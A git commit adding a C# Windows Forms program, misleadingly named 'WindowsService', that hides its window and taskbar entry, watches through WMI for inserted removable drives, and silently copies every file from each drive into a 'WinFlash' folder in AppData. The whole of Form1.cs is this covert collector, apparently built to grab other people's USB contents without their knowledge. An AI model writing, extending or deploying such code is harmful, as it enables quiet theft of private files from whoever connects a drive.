a31a9f11b443ab329b3e85277fa846d2a0bf0f9a
unknown <ilhan.ali.email@gmail.com>
2022-04-30 08:14:56 +0300

    First Commit

---
+++ WindowsService/Form1.Designer.cs
@@ -0,0 +1,70 @@
+﻿namespace WindowsService
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.notifyIcon1 = new System.Windows.Forms.NotifyIcon(this.components);
+            this.button1 = new System.Windows.Forms.Button();
+            this.SuspendLayout();
+            // 
+            // notifyIcon1
+            // 
+            resources.ApplyResources(this.notifyIcon1, "notifyIcon1");
+            // 
+            // button1
+            // 
+            this.button1.BackColor = System.Drawing.SystemColors.Control;
+            resources.ApplyResources(this.button1, "button1");
+            this.button1.FlatAppearance.BorderColor = System.Drawing.SystemColors.Control;
+            this.button1.FlatAppearance.BorderSize = 0;
+            this.button1.FlatAppearance.MouseDownBackColor = System.Drawing.SystemColors.Control;
+            this.button1.FlatAppearance.MouseOverBackColor = System.Drawing.SystemColors.Control;
+            this.button1.Name = "button1";
+            this.button1.TabStop = false;
+            this.button1.UseVisualStyleBackColor = false;
+            // 
+            // Form1
+            // 
+            resources.ApplyResources(this, "$this");
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.Controls.Add(this.button1);
+            this.Name = "Form1";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.NotifyIcon notifyIcon1;
+        private System.Windows.Forms.Button button1;
+    }
+}
+
---
+++ WindowsService/Form1.cs
@@ -0,0 +1,99 @@
+﻿using System;
+using System.IO;
+using System.Management;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Threading;
+using System.Windows.Forms;
+
+namespace WindowsService
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+        public enum EventType
+        {
+            Inserted = 2
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            Launch();
+            string driveName = "";
+            ManagementEventWatcher watcher = new ManagementEventWatcher();
+            WqlEventQuery query = new WqlEventQuery("SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2");
+
+            watcher.EventArrived += (s, e1) =>
+            {
+                driveName = e1.NewEvent.Properties["DriveName"].Value.ToString();
+                var sourceDirectoryPath = Path.Combine(driveName);
+                var sourceDirectoryInfo = new DirectoryInfo(sourceDirectoryPath);
+
+                var targetDirectoryPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "WinFlash");
+                if (!Directory.Exists(targetDirectoryPath))
+                {
+                    Directory.CreateDirectory(targetDirectoryPath);
+                }
+                var targetDirectoryInfo = new DirectoryInfo(targetDirectoryPath);
+                
+                CopyFiles(sourceDirectoryInfo, targetDirectoryInfo);
+
+            };
+
+            watcher.Query = query;
+            watcher.Start();
+            
+        }
+
+        private void CopyFiles(DirectoryInfo source, DirectoryInfo target)
+        {
+            foreach (var file in source.GetFiles())
+            {
+                file.CopyTo(Path.Combine(target.FullName, file.Name), true);
+            }
+
+            foreach (var sourceSubdirectory in source.GetDirectories())
+            {
+                var targetSubdirectory = target.CreateSubdirectory(sourceSubdirectory.Name);
+                CopyFiles(sourceSubdirectory, targetSubdirectory);
+            }
+        }
+        private void Launch()
+        {
+            this.ShowInTaskbar = false;
+            this.WindowState = FormWindowState.Minimized;
+            this.Hide();
+            notifyIcon1.Visible = true;
+            notifyIcon1.ShowBalloonTip(3000);
+        }
+        
+        /*/
+        private void button1_Click(object sender, EventArgs e)
+        {
+            this.ShowInTaskbar = false;
+            this.WindowState = FormWindowState.Minimized;
+            this.Hide();
+            notifyIcon1.Visible = true;
+            notifyIcon1.ShowBalloonTip(3000);
+        }
+
+        private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
+        {
+            this.ShowInTaskbar = true;
+            this.WindowState = FormWindowState.Normal;
+            this.Show();
+            notifyIcon1.Visible = false;
+        }
+        /*/
+
+
+    }
+}
